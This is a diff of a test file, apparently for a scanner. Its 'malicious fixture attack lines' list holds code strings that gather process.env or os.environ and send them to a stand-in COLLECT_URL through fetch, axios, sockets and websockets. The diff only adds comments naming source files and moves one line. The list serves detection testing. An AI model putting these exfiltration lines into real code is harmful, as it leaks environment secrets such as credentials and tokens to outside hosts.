@@ -339,16 +339,18 @@ describe('malicious fixture attack lines', () => {
         'proxy.report(dict(os.environ))',
         'ws.send(json.dumps(os.environ.copy()))',
         'await channel.send(str(dict(os.environ)))',
+        // collect.mjs
         "await fetch(COLLECT_URL, { method: 'POST', body: JSON.stringify({ ...process.env }) });",
         'await axios.post(COLLECT_URL, Object.entries(process.env));',
         'await fetch(`${COLLECT_URL}?${new URLSearchParams(process.env)}`);',
         "request.end(Object.keys(process.env).join(','));",
         "socket.write(Object.values(process.env).join('\\n'));",
         'socket.write(util.inspect(process.env));',
-        'const snapshot: Record<string, string | undefined> = { ...process.env };',
         "${Object.entries(process.env).join('\\n')}`;",
         'const copy = { ...process.env };',
         'const vars = { ...process.env };',
+        // report.ts
+        'const snapshot: Record<string, string | undefined> = { ...process.env };',
       ],
     },
     {
